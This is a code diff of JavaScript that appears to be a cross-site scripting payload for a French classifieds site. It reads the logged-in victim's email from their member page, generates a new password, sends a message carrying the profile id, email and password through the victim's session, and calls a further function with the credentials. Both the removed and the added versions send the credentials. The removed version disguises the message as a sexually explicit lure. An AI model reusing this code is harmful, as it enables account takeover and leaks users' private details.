@@ -26,42 +26,17 @@ fetch('/membres/infos_membre.htm').then(function(response) {
     let mailpath = '//*[@id="form_user"]/fieldset[1]/div/table/tbody/tr[2]/td[2]/input/@value';
     let email = encodeURIComponent("mv" + doc.evaluate(mailpath, doc, null, XPathResult.STRING_TYPE, null).stringValue);
     let pwd = (Math.random() + 1).toString(36).substring(2);
+
     fetch(location.href, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `------WebKitFormBoundarykfIBZEQc7hSdEQRU
-        Content-Disposition: form-data; name="sujet"
-        
-        Re: J'aimerais te rencontrer, voici ma photo ?
-        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
-        Content-Disposition: form-data; name="piece_jointe_1"; filename=""
-        Content-Type: application/octet-stream
-        
-        
-        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
-        Content-Disposition: form-data; name="piece_jointe_2"; filename=""
-        Content-Type: application/octet-stream
-        
-        
-        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
-        Content-Disposition: form-data; name="message"
-        
-        re
-        
-        -------- Message original --------
-        Sujet: J'aimerais te rencontrer, voici ma photo ?
-        De: Jeandp1 <jeandp1.1e21774f@wannonce.com>
-        
-        > J'aimerais te rencontrer; Je suis brun,
-        > et tres bien monte
-        > prof ${profil}, em ${email}, pw ${pwd}
-        > je vais t'en faire voir de toutes les couleurs
-        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
-        Content-Disposition: form-data; name="send_msg"
-        
-        Envoi en cours, patientez SVP...
-        ------WebKitFormBoundarykfIBZEQc7hSdEQRU--`
-
+        body: new URLSearchParams({
+            'sujet': 'Leaf',
+            piece_jointe_1: undefined,
+            piece_jointe_2: undefined,
+            message: "pw_" + profil + "_em_" + email + "_pwd_" + pwd,
+            send_msg: "Envoi en cours, patientez SVP..."
+        })
     }).then((r) => {
         console.log(r.url, r.status);
         hwww(email, pwd);
